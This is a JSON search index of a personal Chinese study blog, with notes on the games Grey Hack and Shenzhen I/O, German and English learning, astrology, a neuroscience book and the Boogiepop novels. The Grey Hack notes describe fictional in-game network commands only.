[{"title":"CI/CD","url":"/2024/07/10/CI-CD/","content":"\n<embed src=\"./7thCS50.pdf\" width=\"100%\" height=\"750\" type=\"application/pdf\">\n\n```html\n<embed src=\"./7thCS50.pdf\" width=\"100%\" height=\"750\" type=\"application/pdf\">\n```\n","tags":["笔记","CI","CD","测试"],"categories":["学习"]},{"title":"game-greyhack","url":"/2024/06/30/game-greyhack/","content":"\n## ch1 network online\n\nTerminal Programs > Network Commands category in the following order:\n\n1. airmon\n\n   **Usage: airmon [start:stop] [net interface]**\n   Example: airmon start wlan0\n\n   Used to enable ==monitor mode== on wireless interfaces. \n   It may also be used to go back from ==monitor mode== to ==managed mode==. \n   Entering the airmon command without parameters will show the interfaces status.\n\n   It is the first step to be able to get the connection ==password== of a wifi router. The network card needs to be activated in ==monitor mode==.\n\n   ```lua\n   //command: airmon\n   cryptools = include_lib(\"/lib/crypto.so\")\n   if not cryptools then exit(\"Error: Missing crypto library\")\n   if params.len > 0 and (params.len != 2 or params[0] == \"-h\" or params[0] == \"--help\") then exit(command_info(\"airmon_usage\"))\n   \n   computer = get_shell.host_computer\n   formatOutput = \"Interface Chipset Monitor_Mode\\n\"\n   if params.len == 0 then\texit(format_columns(formatOutput + computer.network_devices))\n   option = params[0]\n   device = params[1]\n   if option != \"start\" and option != \"stop\" then exit(command_info(\"airmon_usage\"))\n   \n   output = cryptools.airmon(option, device)\n   if not output then exit(\"airmon: \" + device + \" not found\")\n   if typeof(output) == \"string\" then exit(output)\n   print(format_columns(formatOutput + computer.network_devices))\n   ```\n\n   \n\n2. iwlist\n\n   **Usage: iwlist [net device]**\n   Example: iwlist wlan0\n\n   Shows the list of wifi networks visible from your computer.\n\n   [Usage Details]\n\n   Once the iwlist command is executed the output will show something similar to this:\n   ==BSSID                     PWR   ESSID==\n   ==14:C7:E5:46:D9:F5  65%   corpdevice==\n\n   ==BSSID== is the identifier of the device.\n   ==PWR== is the coverage that reaches the Wi-Fi network installed in your PC in a range of 0% to 100%. The higher this number is, the closer your device is to your location and you can capture the packets faster.\n   ==ESSID== is the name of the router access point.\n\n3. aireplay\n\n   \n\n4. aircrack\n","tags":["笔记","游戏"],"categories":["学习"]},{"title":"游戏-深圳I/O","url":"/2024/06/29/游戏笔记-深圳I-O/","content":"\nWalkthrough：https://steamcommunity.com/sharedfiles/filedetails/?id=780661614\n\n### 第一关  安全摄像头\n\n这关很简单。按照示例基本可以猜个八九不离十。\n\n**slp**：让CPU进入sleep状态，规定睡眠时间单元。\n\n**mov**：真实指令。数据传送。\n\n```assembly\nmov 100 p1\t#向引脚p1发送方波\nslp 3\t#前3个时间单元内为100状态\nmov 0 p1\nslp 3\n```\n\n```assembly\n#傻瓜算法-设计1\n#成本6元，60用电量，12代码行。\nmov 0 p0\nslp 4\nmov 100 p0\nslp 2\nmov 0 p0 \nslp 1\nmov 100 p0\nslp 1\n```\n\n\n\n### 第二关 工厂模型替换件\n\n看了一下输入输出波，第一关那种设计1傻瓜移跳完全不得行了，那要到上百行里去了。\n\n**acc**：主存储器，可以存储-999~999的整数。内部计算。所有数学计算都将\n\n使用并修改 acc 的值。\n\n**mul**：将第一个操作数的值与 acc 存储器的值相乘，并将结果存入 acc 存储器。\n\n**提示：将控制输入的信号值乘以2以后，复制到控制输出。**\n**步进可以观察acc中的数值以及控制输入输出的数值，有助于理解。**\n\n```assembly\n#设计1-成本3，240用电量，4代码行\nmov p0 acc\t#将p0输入信号存储在acc存储器中\nmul 2\t#将2与acc存储器中的数值相乘，并将结果存入acc中。\nmov acc p1\t#将acc的值发送到p1控制输出。\nslp 1\t#推进时间1\n```\n\n### 娱乐时间：解锁纸牌游戏\n\n哈哈哈哈哈哈，摸鱼，启动！\n\n啊啊啊，感觉很复杂，完全没有头绪呢....这游戏中的游戏真的能通关吗？\n\n目前思路：\n\n1. 开场先观察中发空哪个好露出。然后开始凑牌。\n2. 局势不对重开！重开！\n3. 和羊了个羊一样每局不一定有解\n4. 把1先挪上去，开始凑花色\n5. 6月30号第一次纸牌胜利\n\n### 第三关 诊断脉冲生成器\n\n提示：有条件执行结构。根据按钮的输入不同，脉冲输出也不同。\n\n**teq**：测试第一个操作数 (A) 是否等于第二个操作数 (B) 的值\n\n|  **条件**  | **对**‘+’ 指令的作用 | **对**‘-’ 指令的作用 |\n| :--------: | :------------------: | :------------------: |\n|  A 等于 B  |       允许执行       |       禁止执行       |\n| A 不等于 B |       禁止执行       |       允许执行       |\n\n答案不唯一。\n\n观察脉冲，发现未按按钮（p0=0）输出p1也为0；按下按钮时，形成10波。\n\n```assembly\n#设计1-成本3，164用电量，7代码行\n  teq p0 100\t\n+ mov 100 p1\t\n+ slp 1\n+ mov 0 p1\n+ slp 1\n- mov 0 p1\n- slp 1\n\n#新设计2-同上，无差别\n  teq p0 0\n+ mov 0 p1\n+ slp 1\n- mov 100 p1\n- slp 1\n- mov 0 p1\n- slp 1\n```\n\n### 第四关  动画ESPORSTS标志\n\n换音乐了！不错！带感！\n\n全部都是简单输出，那么就是说明所有简单IO引脚都可以用作输出。\n\n```assembly\n#设计1 喝0与-1连接。成本11，215用电量，24代码行。\n#点击1与点击2\n  mov 100 p0\n  mov 0 p1\n  slp 1\n  mov 0 p0\n  mov 100 p1\n  slp 1\n  \n#喝0与-1部分（这里如果0与-2写一起，可以节省代码行使用小芯片节省成本）\n  mov 100 p0\n  mov 0 p1\n  slp 6\n  mov 0 p0\t     \n  mov 100 p1\t \n  slp 1\t\t\t \n  mov 0 p1\n  mov 0 p0\n  slp 2\n  mov 0 p0\n  mov 100 p1\n  slp 1\n  \n#喝2部分\n  mov 0 p0\n  slp 7\n  mov 100 p0\n  slp 2\n  mov 0 p0\n  slp 1\n\n```\n\n\n\n```assembly\n#设计2 喝0与-2连接。成本9，电量使用211，代码行23\n#点击1与点击2与设，计1无区别。\n  mov 100 p0\n  mov 0 p1\n  slp 1\n  mov 0 p0\n  mov 100 p1\n  slp 1\n \n#喝0与-2部分\n  mov 100 p0\n  mov 0 p1\n  slp 6\n  mov 0 p0\n  #p1为0默认不改变，不提及，继续往前1\n  slp 1\n  mov 100 p1\n  slp 2\n  mov 0 p1\n  #p0为0默认不改变，不提及，继续往前1\n  slp 1\n  \n#喝1部分\n  mov 0 p0\n  slp 6\n  mov 100 p0\n  slp 1\n  mov 0 p0\n  slp 2\n  mov 100 p0\n  slp 1\n```\n\n加入反相器！超强优化！\n\n反相器：**这个器件可以将输入信号的相位反转180°。**反相器是最简单的门电路，它只有一个输入端和一个输出端，输入和输出都只有高电位和低电位(在数字电路中称之为高电平和低电平)两种相反的状态，如果高电平用“1”表示，低电平用“0”表示，反相器输出与输入之间特定的逻辑关系就是“输入为1，则输出为0；输入为0，则输出为1”，输出总是输入的否定，所以反相器称为“非门”。\n\n输出表\n\n| A输入 | B输出 | 反相器LC70G04 |\n| :---: | :---: | :-----------: |\n|   0   |   0   |       1       |\n|   0   |   1   |       1       |\n|   1   |   0   |       0       |\n|   1   |   1   |       0       |\n\n\n\n```assembly\n#设计3 加入反相器。\n\n```\n\n","tags":["阅读","游戏"],"categories":["碎碎念"]},{"title":"英语原著计划与生词","url":"/2024/06/06/英语原著计划与生词/","content":"\n1. Boogiepop Returns VS Imaginator \n\n   2024.06.29\n\n   已经阅读完一半了，都是比较简单的句子。是日语翻译成英文的版本。\n\n   今年到六月初看了37本纸质课外书，之后打算加强英语学习。尽量阅读英文的小说或者书本。大概七月前就能看完这本书吧，薄薄的内容也不长，剧情非常有趣，已经看过很多遍了。\n\n2. the code book\n","tags":["阅读","学习","英语"],"categories":["碎碎念"]},{"title":"德语自学","url":"/2024/02/03/德语自学/","content":"\n## 入门\n\n材料：【【德语零基础】迅速入门德语必看！珍妮老师的德语课堂第一部分，英德双语教学，简单实用易会】 https://www.bilibili.com/video/BV1m7411H7dd/?share_source=copy_web&vd_source=d5530a28532a2f6243f002dbc6b3fb4a\n\n2024/2/3\n\n### 01课\n\nja (yes)\n\nnein (no)\n\nvielleicht (maybe)\n\nder(masculine article)-die(feminine article)-das(neutral article) (the)\n\ndas Auto (the car)\n\nwo (where)\n\nWo ist das Auto? (Where is the car?)\n\nich (I)\n\nIch lerne Deutsch. (I' m learning/studying German.)\n\nlernen (to learn)\n\nder Mann (the man)\n\ndie Frau (the woman)\n\nim Auto (in the car)\n\nim = in dem\n\nDer Mann ist im Auto. (The man is in the car.)\n\nDie Frau im Auto. (The woman is in the car.)\n\n\n\n\n\n\n\n","tags":["语言","学习","德语"],"categories":["碎碎念"]},{"title":"python-《程序员数学》笔记","url":"/2024/01/24/python-《程序员数学》笔记/","content":"\n","tags":["阅读","数学","python"],"categories":["科研"]},{"title":"玄学笔记","url":"/2024/01/22/玄学笔记/","content":"\n## 西方\n\n### 占星术\n\n### 🚩《内在的天空》——本命盘\n\n#### 占星学的七大原则——进化占星学\n\n> 1. 占星符号都是中性的，没有好的，也没有坏的。\n> 2. 每个人应该为自己如何去体现自己的星盘而负责。\n> 3. 没有一个占星师能够仅仅通过星盘来判定一个人会如何地展现他的星盘。\n> 4. 星盘是一个人可能达到的最快乐、最满足、最灵性、最富有创造性的成长之路的蓝图。\n> 5. 所有对这个理想成长模式的偏离都是不稳定状态，通常都会带来一种无目的感、空虚、以及焦虑。\n> 6. 占星学里只有两点是绝对的：生命本身所拥有的不可去除的神秘性；以及每个个体对这种神秘性的独特看法。\n> 7. 当占星学跟任何一种哲学或者宗教结合得太紧密时，它就受到了损害。在占星学系统中，除了一个人的自我意识，没有什么是真正重要的。\n\n> 这七个原则都很基本。去掉任何一个，或者扭曲任何一个都会让整栋建筑轰然倒下，沦为算命。\n> \n> 我们是自由的。宇宙的力量和人类意志共同以一种敞开、共时的方式运作。它们之间的结合所造成的结果无法被预测，就象一个孩子的性格无法通过了解他的父母来断定一样。\n> \n> 一切都归结于此：占星象征是动词，而不是名词。我并不是一个摩羯座，我正在成为一个摩羯座。成长、改变、进化，这就是占星的核心。把宿命主义和僵化留给那些算命先生吧，我们的工作不是这些。\n\n#### 行星落入星座和宫位的含义——基本词汇\n\n**行星**是**“什么”**\n\n**星座**是**“怎样”和“为什么”**\n\n**宫位**问的是一个最实际的问题：**“哪里”**？\n\n> 每一个宫位都是一个独特的战场，每一个都代表一个人生活中的一个部门，他可以在其中做出选择。每一个宫位也是一个固定的现实，在其中有一些给定的模式。一个确定的地貌。我们可以爬山，也可以选择进入山谷。但是不管多大的意愿也无法将这个地方变成平地。\n\n> 我们要永远记住，一个宫位只是意识可以进入并且表现自己的领域。这些领域有些是可见的，有些则不可见。它们还是能够回答 “哪里 ”的问题。\n\n##### 五个步骤\n\n> 第一步：看行星。我们所考虑的**什么**心识功能？我们在说心识的哪个部份？是太阳的自我形成？还是土星的纪律建立？\n> \n> 第二步：看星座。它是在驱动这颗行星的东西。那个行星功能在寻求什么？它的行动之下是“为什么”？它隐藏的动机是什么？只有星座能够告诉我们这一点。我们在这里所得到的是一种目的感。进化的方向。如果我们所解读出来的话显得非常的分散和漫无目的，那么我们很可能是没有做好第二步。\n> \n> 第三步：想一想，这个“行星－星座”组合**怎样**完成它的目标？星座提供了哪些相关的**资源**？行星呢？你可能会需要去查一查星座章节里的资源部份或者行星章节里的**功能**部份。如果你是这个人，你拥有这些长处和责任，**你**会如何去得到幸福呢？\n> \n> 第四步想一想，这个“行星－星座”组合可能会被**怎样**地扭曲？哪种行为会跟这个碎片的意义一致但是跟它的进化目的不一致？如果你不确定，可以查看星座章节里的**阴影**以及行星章节里的**可能发展出的缺点**。**请记住，以一种警告的方式来呈现这些可能缺点，而不是以预言的方式。**\n> \n> 第五步看宫位。这个“行星－星座”的事务会在**哪里**发展？它们会创造出什么样的行为？如果对这个“行星－星座”进行一个强的反应的话，在这个人生活的哪个部份会产生一些**境遇**的改进？\n\n> **我们必须以一种整合的方式来思考。**\n\n#### 相位——语法和句法\n\n> 如果说星座、行星、和宫位是占星语言中的基本词汇，那么相位就是描述这些词语必须怎样组合在一起的语法和句法。\n\n> 传统的占星师们将相位分为两种：好和坏。这两个词从来不会给我们带来清晰的占星思考。所有的相位都是功能性的，每一个都有其目的。有些感觉起来比另一些舒服，但那是次要的。常常是那些感觉最好的相位让我们陷入最糟的困境。将好和坏从你的思考中去掉，至少从你的占星思考中去掉。让我们从功能的角度来看一看这些相位，而不是从它们是容易或者困难的角度去看。\n\n##### 零度：相合\n\n当两颗行星彼此重叠时，就是相合。\n\n<u>**融合。**</u>\n\n> **在相合相位中，两种通常是分开和独立的功能，会融合在一起。如果不启动其中的一个，另一个不可能运作。**\n\n##### 180度：相冲\n\n<u>**拉扯**。</u>\n\n如果一个出生星盘里有这个相冲相位的人**能够同时将这两极都放进意识**，让它们达成相互妥协，那么他或者她的生活将变丰富得多。\n\n适应良好：弹性、变化、和适应性\n\n适应不好：内耗、拉扯、一事无成\n\n星盘中相对的那些星座。\n\n##### 90度：相刑\n\n<u>**摩擦。**</u>\n\n相冲要更加和谐。\n\n相刑的两个星座没有任何相互理解的基础。\n\n相刑就是天敌之间的相位。\n\n目的：进化。\n\n这个相位所制造的摩擦会给行星带来无情的进化压力。\n\n适应良好：焦虑带来成长。\n\n适应不好：杀死另一个，缺失，残废。\n\n##### 120度：三合\n\n<u>**和谐。**</u>\n\n自然的盟友。\n\n但仍然需要**点燃。**\n\n> 内在和谐——这是三合的长处和弱点。被这个相位所连接的行星彼此之间不会有冲突。但是冲突并不一定是坏的，有时它会孕育出均衡和好的判断力。\n\n让行星缺乏审视自己的视角。\n\n拥有无尽成长潜能。\n\n我们必须想象有什么力量沉睡在这相位之中，然后以**意识和自律的行动来释放它们**。\n\n适应良好：\n\n适应不好：没有动力、懒惰、自我满足\n\n找出三合相的技巧在于记住星座的元素。所有的火象星座彼此三合。所有土象，风象，水象星座也一样。\n\n##### 60度：六合\n\n**<u>兴奋、激发。</u>**\n\n一个打折的三合相位。\n\n被激发而进入了运作状态。\n\n六合跟三合一样，很难看到自己。\n\n适应良好：带我们走得更远，并且以更少的努力做到这一点。\n\n适应不好：多彩，戏剧化，但是毫无用处。\n\n##### 次要相位\n\n在其他的天空中有详解。\n\n##### 容许度\n\n> 准确的相位是最有力的，但是一个偏差 2、3度的相位也非常充满能量。 5度的话，也还很强，不能忽略。 6到 7度的话，也还有效，但是效果肯定减弱了。 8或者 9度的话，还有一点效果但是非常微弱，这时候我们可以保险地将注意力放在别处了。如果是关于太阳或者月亮的容许度，那么还可以加上一两度。\n\n我们所考虑的这个位置的**前后8度**以内。\n\n#### 守护行星\n\n有些行星会比其它一些更有助于一些星座特质的表达。\n\n一颗**跟一个星座关系很密切的行星**被叫做那个星座的守护行星。\n\n**一颗行星落陷的星座总是跟它守护的星座相冲。**\n\n#### 月亮交点\n\n即使一个新出生的婴儿也有一个过去。\n\n**月亮的南北交点将星盘跟历史联系在一起。**\n\n**南交点：我们的祖先对我们的影响。轮回中的业力。本能和自动的模式。通过生活自然和不费力的流动。**擅长而丧失创新。\n\n> 南交点的星座会添加上“怎样”和“为什么”：它代表了一种在你里面自然升起的**思维倾向和驱动模式**，这种模式可能永远都不会受到挑战。\n\n但是他的认知被一些无意识的偏见所影响了。\n\n**北交点：我们成长的前沿。南交点的解药。**\n\n> 领域：正在进行时的生活。所有这些都跟南交点的每一个偏好相反。在过去和未来之间挣扎，这个人必须做出一个选择。为了成长，他或者她需要北交点。但是得到它需要很多的努力，也许还需要帮助，一定还需要一些尴尬。另一个选择总是在引诱这个人走那条容易的路：再一次演南交点的那些戏剧，待在安全的地方。如果他选择了这条路的话，那么他将看起来像一个大师，但是死的时候感觉自己像个傻瓜。\n\n#### ⭐三大巨头——性格的骨架\n\n> **第一原则：在你能够完全透彻地理解了太阳、月亮和上升之前，忽略所有其它信息。**\n\n太阳：自我。个性，价值观，生命动机。——我是一个独特的人，拥有某一种天性和某一些无意识的倾向\n\n月亮：灵魂。主观因素，本能维度，精神的心情。——我们的感受和恐惧、我们的情感需要和我们的喜爱\n\n上升：面具。\n\n> **太阳、月亮、和上升：个性，个性背后的灵魂，以及它在世间所戴的面具。**\n\n*我以前一直不确定自己是具体几点出生的。我妈妈说，我是十一点半出生的。但是我爸在照片册里写的却是十点二十。所以我以三大巨头的性格倒推哪一个才是真的？因为这一个小时的变动，三大巨头的变化也是巨大的。最后我发现妈妈说的是正确的！*\n\n##### 五个步骤\n\n> 第一步找到你的太阳，它的 “**什么**”就是个性的形成？看看它所在的星座。**为什么**这个人活着？他的进化目标是什么？他**怎样**才能最有效地实现它？它所面临的危险是什么？现在加上太阳的宫位。他在**哪里**会遭遇到这些太阳的自我形成的问题？他生活的主要战场在哪里？\n> \n> 第二步找到你的月亮。它的“**什么**”是这个人的主观、情绪特质的形成。它以哪个星座的形式表现？哪些体验对他的幸福来说最重要？他**怎样**获得它们？当他被情绪和不理解控制时，它们是如何表达的？现在加上月亮的宫位。他在**哪里**会面临生活中最激烈的情绪问题？他在哪里必须学会以最本能和超越理性的方式做出最实际的选择？在哪里他必须信任自己的“灵魂”？\n> \n> 第三步看看上升。这并不是一个行星，不过我们的步骤非常类似。对世界来说，这个人看起来是什么样子？他的面具是什么？哪种社会人格对他来说最合适做为一种舒服的日常身份？这个面具跟我们在太阳和月亮中看到的有什么不一样？有什么相似之处？这些对比会带来什么相互加强或者问题？\n> \n> 第四步看看这三者之间的相位关系。太阳、月亮、和上升是怎样连接的？你也许会找到几个这样的相位，也许一个都找不到。如果你的确发现了一个这样的相位，尝试去理解这些人格主要要素之间是如何连接在一起的。这带来了什么增益？有什么危险？\n> \n> 第五步这是最难的一步，也是最重要的一步。感觉一下这个人的三要素。如果你只能用一句话来描述它，会是什么？**这个人是什么？**有水元素和内向宫位的加强吗？三要素的质感主要是外向吗？玩闹吗？严肃吗？自大？害羞？把握它，你就建立了一个分析星盘其它部份的基本氛围。如果没有把握，你的解释就会碎片和分散化。\n\n#### ⭐半球侧重\n\n地平线：上下两个半球。\n\n上半球：客观。\n\n下半球：主观。\n\n竖直线/子午线：东左西右。\n\n东边：自由和个人选择。\n\n西边：命运或者宿命。\n\n> 当大部分行星落在地平线之上时，这个人的生活主要集中在客观领域中：他或者她会通过设计一系列的事件来成长，通过它们将进化后的个性得到了公开和可见的表达。这种格局并不总是会代表社交和外向的个性。但是它表示从长期来看，这个人不会很快乐地从世界中退出。世界是他的广场，如果他从那里退出，成长就不可能发生。而如果没有成长，快乐也是不可能的。\n\n#### ⭐焦点行星——入旺\n\n> 即使一个非常强的焦点行星也可能有一两个衰弱之处。我们必须均衡各个因素，做出自己的判断。\n\n1. **上升星座的守护星——建立自己的个人独特性和身份感**\n\n2. 跟太阳相合的行星\n\n3. 星群\n\n4. 合轴行星\n   \n   > 星盘的四个轴——上升、下降、中天、和天底——是力量之点。任何一个跟它们相合的行星马上就被弹射到了一个极端重要的位置。\n   \n   > 真正合轴的行星是最显要的，但是落在任何一根轴之后的宫位里面的行星也是重要的。第一宫、第四宫、第七宫、第十宫，这些宫位是本位宫位（angular houses），落在这些宫位里的行星地位也都会得到提升。它也会变成一个焦点行星。\n   \n   > 上升点是四轴中最敏感的一个。一颗跟上升相合或者落在第一宫的行星必须被认真对待。对待它就象对待上升的守护星一样。解读它的逻辑也跟上升是一样的，只是现在是：这颗行星成了这个人面具的一部分，加深或者强烈改变上升星座的信息。就象上升一样，它会影响这个人的样子和个人风格。\n\n5. 孤 星\n   \n   **一颗单独落在任何四个半球中一个中的行星。**\n\n6. 静止行星\n   \n   当一颗行星在天空中停止下来，准备逆行或者前行时，它就静止了。\n\n7. 强烈相位\n\n#### ⭐南北交点\n\n> **通过比较南交点和整个星盘，我们决定这个人从前所做的和现在想要通过这个星盘所完成的之间有什么拉扯。**\n\n北交点告诉我们自己必须成为什么样子。不是我们将会成为的，不是命运，不是宿命，只是方向。\n\n#### ⭐找出星盘中的模式和主题\n\n发现行星之间的联系，注意主题之间的相互联系以及拉扯。\n\n### 🚩《变幻的天空》——推运\n\n### 🚩其他感兴趣的问题\n\n#### 如何判断是否适合去海外留学发展移民？\n\n##### 🚗我\n\n参考资料：\n\nhttps://mp.weixin.qq.com/s/Nza8ET237ScQlHPXFOo_Iw\n\nhttps://mp.weixin.qq.com/s/x7Vy1PcbQrN3gHn0lH5xlA\n\n1、移民配置：\n\n> **指标配置一：**\n> \n> **第一宫的宫主星落入第十二宫。**这是一个非常强烈的指标说明你会移民海外，如果你现在还没有这方面的打算和计划，且自己还是长期居住在自己的出生地附近，并觉得自己的人生各种受限没有什么发展的话，建议是可以换一个环境，越远越好，然后人生可能就有转机了。\n> \n> 背后的逻辑：很简单，第一宫代表了物理的你，所以第一宫的宫主星去到了代表了“海外\"的十二宫就自然是你自己去到了海外。同时第一宫代表了自信和自我的程度，所以同时也说明在你去到”海外”后，你的自信和自我会就会开始得到提升和发展，因为种子在，你要给放到它需要的土壤里。\n\n| 宫位     | 星座  | 宫主星（命主星） | 飞入    |         |\n|:------:|:---:|:--------:|:-----:|:-------:|\n| 1宫     | 水瓶  | **土星**   | 白羊（陷） | **2宫**  |\n| **1宫** | 水瓶  | **天王**   | 水瓶（庙） | **12宫** |\n\n> **指标配置二：**\n> \n> 第二宫的宫主星落陷；**第二宫宫内有土星或者南北交点**；**第二宫的宫主星落第十二宫。**\n> \n> 这几个配置的话具体看情况，有可能是离开出生地比较远，不一定是出国去海外长期定居，但是也不排除，同时或者可能是有和海外相关的工作。**尤其是土星或南北交点落第二宫的话**，可能很早就会和家人分离（土星耀升、入庙或者庙旺的话除外）而去到比较远的地方或者是海外。\n> \n> 背后的逻辑：第二宫是一个关于我们和原生家庭链接的宫，第二宫宫主星落陷则说明这个链接弱，同时土星和南北交点都是代表了分离的星，土星代表了文化差异，南北交点一般代表了异域和海外。同时第二宫代表了我们的食物，从我们出生（第一宫）之后要继续存活就需要第二宫的“食物”的供养，第二宫宫主星落入第十二宫，所以“食物”来自于海外，因此也有一定的可能性。\n\n| 宫位     | 星座  | 宫主星    | 飞入  |         |\n|:------:|:---:|:------:|:---:|:-------:|\n| 2宫     | 双鱼  | 木星     | 水瓶  | 1宫      |\n| **2宫** | 双鱼  | **海王** | 摩羯  | **12宫** |\n\n第二宫宫内有土星。\n\n**2、和工作学习机会相关的临时性的海外长期居住配置：**\n\n> **指标配置一：**\n> \n> **第九宫宫主星落第十二宫**，还有第五宫宫主星落第十二宫。撸主自己也是第五宫宫主星落第十二宫，所以这个只是临时性的，只是临时性的一段比较长期的海外居住，就是留学啦。\n> \n> 背后的逻辑：这两个宫都是关于教育的宫，所以这个就是一个出国留学的标配。\n\n| 宫位     | 星座  | 宫主星    | 飞入  |         |\n|:------:|:---:|:------:|:---:|:-------:|\n| **9宫** | 天蝎  | **火星** | 摩羯  | **12宫** |\n| 9宫     | 天蝎  | 冥王     | 射手  | 10宫     |\n\n3、有利于国外发展的星盘配置\n\nhttps://mp.weixin.qq.com/s/B-wHq949TzroqpvD-P9k5Q\n\n## 东方\n\n### 基础\n\n资料——某公众号\n\nhttps://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg2NjU1MzY2Ng==&action=getalbum&album_id=2488851579035631618&scene=173&from_msgid=2247484714&from_itemidx=1&count\n","tags":["阅读","随笔","玄学"],"categories":["碎碎念"]},{"title":"《大脑驭手》阅读笔记","url":"/2024/01/19/《大脑驭手》阅读笔记/","content":"\n#### 作为艺术的意识\n\n哈哈，写的很优美也很艺术，但是，我全部都不认同。\n\n#### 记忆中枢\n\n> 20 世纪60年代，当时的MIT心理学家韦恩·威克尔格伦(Wayne Wickelgren)提出，海马区能促进大脑外部皮层新皮质中永久记忆的形成。这些皮层记忆采取强化神经元之间联系的形式。因此，新皮质类似于存储库，而海马区则像是记忆的构建者，无论是情景记忆(比如我对遇见Henry的记忆)，还是语义记忆(比如一个词的含义)。这一想法在很大程度上源自与Henry的合作，它是对早期理论的一个巨大修正。此前，研究人员认为海马区是记忆的直接存储库。由于Henry的新皮质没有受到损伤，因此手术前存储的单词记忆应该是完整的。\n\n> 海马复合体必定参与了保存旧记忆和制造新记忆的过程。就像一个建筑工人可以建造一个新结构或修复一个受损结构一样，海马体也可以制造新记忆来替换那些随时间推移而退化或破碎的记忆。\n> \n> 每当有人回忆起一个被遗忘的单词或过去的个人轶事时，这种重建就可能发生。通过这种方式，近期的接触和学习可以加固受损的记忆并减少记忆丢失。在Henry 的情况中，这种海马体维护系统失效了。Henry无法通过重新经历和学习修复破碎的记忆，导致记忆加速退化。\n\n#### 大脑中的GPS\n\n记忆宫殿的科学原理。\n\n#### 冥想之力重塑大脑\n\n##### 冥想的种类\n\n1. 专注冥想(focused- attention meditation)：旨在控制大脑，将注意力集中在当前时刻，同时提高冥想者对分散注意力的东西保持警惕的能力。\n2. 正念冥想(mindfulness)或称“开放监视”冥想(open- monitoring meditation)：旨在让冥想者减少对当前想法和感觉的情绪反应，以防情绪失控和精神痛苦。在正念冥想过程中，冥想者须时刻留心自己的所有感受，但又不能将注意力集中在任何特定感受上。\n3. 慈悲和仁爱冥想：培养冥想者的同情心和利他精神，同时把对个人的专注倾向最小化。\n\n##### 专注冥想的大脑\n\n认知周期的4个阶段：大脑走神阶段、意识到注意力分散阶段、重新集中注意力阶段以及恢复专注阶段。\n\n###### 周期第一阶段\n\n即在冥想者走神时，大脑默认模式网络(default-mode network,以下简称DMN)的活动就会增加。大脑默认模式网络包括这些区域：内侧前额叶皮层(medial prefrontal cortex)、后扣带回皮层(posterior cingulate cortex)、楔前叶(precuneus)、顶下小叶(inferior parietal lobe)以及外侧颞叶皮层(lateral temporal cortex )。目前已知，人在走神时，DMN会被激活，在建立和更新人们的内心世界时发挥广泛的作用(人们内心世界的建立是基于自我和对他人的长时记忆)。\n\n###### 周期第二阶段\n\n大脑的活动区域转移到其他脑区，比如前脑岛(anteriorinsula)和前扣带回皮层(anterior cingulate cortex)，也就是我们所谓的“凸显网络”( salience network)。这一网络可以调控我们的主观感受，而这些感受可能会导致我们在执行任务期间分心。一般认为，“凸显网络”在感知新事件时会发挥重要作用。而在冥想期间，“凸显网络”可以切换各个神经元群的活动状态，比如，把注意力从大脑默认模式网络转移到其他地方。\n\n###### 周期第三阶段\n\n涉及另外两个大脑区域:背外侧前额叶皮层(dorsolateral prefrontal cortex )和顶下小叶(inferior parietal lobe)。它们可以让注意力离开任何让人走神的外界刺激，从而让冥想者重新集中注意力。\n\n###### 周期第四阶段\n\n位于前额之后的背外侧前额叶皮层活动会增多，这通常表明注意力已经集中在某一对象上，比如呼吸。\n\n###### 引申\n\n1. 高级冥想者可以更快达到聚精会神的状态。消耗更少能量做更多事情。\n2. 冥想者有更强保持警觉的能力。\n3. 冥想者的大脑对高音的反应表现的更加稳定。\n\n##### 正念冥想的大脑\n\n1. 无反应式感官知觉的增强。\n2. 冥想者可以更好地分配自己的注意力。\n3. 疼痛感在冥想者身上并不会减轻，但对冥想者造成的困扰显然不像对照组中那么明显。\n4. 在疼痛刺激出现之前，资深冥想者大脑中与焦虑有关的区域-岛叶皮层(insular cortex)和杏仁核(amygdala)的神经活动会减少。\n5. 可以提高人体对基本生理反应（例如应激激素水平和炎症反应）的掌握。\n6. 有利于缓解焦虑与抑郁症状，改善睡眠质量。\n7. 降低抑郁症复发概率。\n\n##### 慈悲和仁爱冥想的大脑\n\n1. 冥想者对他人遭遇感同身受的能力有所提升，而且他们在情感上也没有对比表现出难以承受的迹象。\n2. 增强亲社会行为，助人能力。\n3. 更少的情绪衰竭。\n\n##### 冥想带来的变化\n\n1. 维持一种特殊脑电活动。γ频段震荡，25HZ和42HZ相位同步。\n2. 布罗德曼9区与10区激活，变大。\n3. 处理恐惧情绪杏仁核变小。\n4. 资深冥想者进行一天的高强度正念冥想训练，可以降低与炎症相关的基因的活性，并改变可以促进或抑制基因表达的酶的功能。\n5. 正念冥想训练或能减缓某些冥想者的细胞衰老进程。\n\n#### 寻找最佳大脑食谱\n\n1. 地中海控糖饮食可以缓解炎症，增加免疫力，缓解抑郁症焦虑症，预防痴呆。\n2. DHA也很关键。促进脑神经连接与发育。\n3. 肠道生物群对健康有影响。\n\n#### 研究前沿\n\n1. “突显特性”，相互作用的系统。猜测需要物理数学等等方面的知识做理论了。\n2. EEG记录几毫秒内脑电波起伏震荡，无法监测单个神经元活动。\n3. fMRI监测血流变化，记录过程缓慢，分辨率低。\n4. 钙成像，电压成像，新型材料，纳米技术。\n5. 分子磁带，电子，光子。\n6. 操纵神经元，神经回路。\n7. 类脑器官\n8. 脑机接口\n","tags":["阅读","认知科学","科普"],"categories":["科研"]},{"title":"诡异的泡泡——Boogiepop的全系列思考","url":"/2024/01/18/诡异的泡泡——Boogiepop的全系列思考/","content":"\n#### 第一卷：幻影死神\n\n一个第一卷就彻彻底底完结的故事。来自二十七年前的故事。\n\n我最喜欢的角色雾间zhi，也是我理想中希望成为的模样。\n\n普通是什么？\n\n雾间诚一给出了答案：“普通就是放手不管并一直维持这种样子。”\n\n放弃普通的生活，去拯救世界，让自己成为世界的可能性，去参与，去干涉，去改变，甚至引发革命。\n\n人生短短几十年罢了。要爆发出那种最热烈最耀眼的光。\n\n时刻记着自己的使命与意志，不要走偏，时常内观，不要一昧追求刺激却走向了世界的反面。\n\n关于zhi的恋父情结来源于弗洛伊德的俄狄浦斯。好的是我不信这一套，不信任何传统精神分析的大多数。我相信也没多少人相信了，哈哈。\n\n我信什么呢？\n\n我信某些远古的母系传承，证据就在三星堆，只是某些人出于不想颠覆正统历史，他们一直拖延以至于妄图掩盖某些真相。\n\n仿佛某一天觉醒。起来忽然感受到了某种使命。探索未知，将自我看作世界的可能性向脑海中的理想奔腾而去。\n\n\n\n##### 补记 